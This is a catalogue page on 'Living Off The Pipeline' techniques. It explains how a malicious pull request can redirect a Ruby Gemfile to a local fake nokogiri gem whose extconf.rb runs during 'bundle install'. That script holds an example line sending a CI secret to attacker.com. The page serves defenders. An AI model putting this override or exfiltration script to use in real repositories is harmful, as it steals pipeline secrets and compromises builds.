---
layout: tool
title: bundle
parent: Living Off The Pipeline
nav_order: 8
---

## Living Off The Pipeline - bundle (Bundler)

Bundler is the standard dependency manager for Ruby. It can be abused as a "Living Off The Pipeline" (LOTP) tool by manipulating the `Gemfile` to load a malicious, local version of a gem, leading to Remote Code Execution (RCE).

### First-Order LOTP Tool

Bundler is a **First-Order LOTP Tool**. It provides direct RCE when it processes a malicious `Gemfile`.

#### Malicious Primitive: Remote Code Execution (RCE)

The `Gemfile` allows developers to specify a dependency's source using a local `path`. This feature, intended for development, can be weaponized by an attacker in a pull request.

An attacker can replace a legitimate gem with a malicious local version that contains an `extconf.rb` script. This script is a standard part of gems that build C extensions, and it is executed by the `bundle install` command. The attacker places their malicious payload in this script.

### Second-Order LOTP Attack Chain

1.  **Attacker's PR:** An attacker submits a pull request containing:
    *   A modified `Gemfile` that points a common gem to a local path.
        ```ruby
        # Gemfile
        gem 'nokogiri', path: './malicious/nokogiri'
        ```
    *   A malicious version of the gem at that path, including a malicious `extconf.rb` script.
        ```ruby
        # malicious/nokogiri/extconf.rb
        require 'open-uri'
        # Malicious payload
        open("http://attacker.com/?data=#{ENV['SUPER_SECRET']}")
        ```

2.  **Vulnerable Workflow:** The pipeline contains a completely standard command to install dependencies.
    ```yaml
    - name: Install Ruby gems
      run: bundle install
    ```

3.  **Execution:**
    *   The `bundle install` command reads the `Gemfile`.
    *   It finds the `path` directive and uses the attacker's local, malicious version of the `nokogiri` gem.
    *   During the installation process, Bundler executes the malicious `extconf.rb` script to (purportedly) build the native extension.
    *   The attacker's payload runs, leading to RCE.

This attack is dangerous because the CI/CD workflow file is benign, and the malicious code is hidden in a file (`extconf.rb`) that is expected to be executed during a normal installation.

### References

*   [Bundler `path` option](https://bundler.io/man/gemfile.5.html#PATH)
*   [RubyGems: C Extensions](https://guides.rubygems.org/c-extensions/)
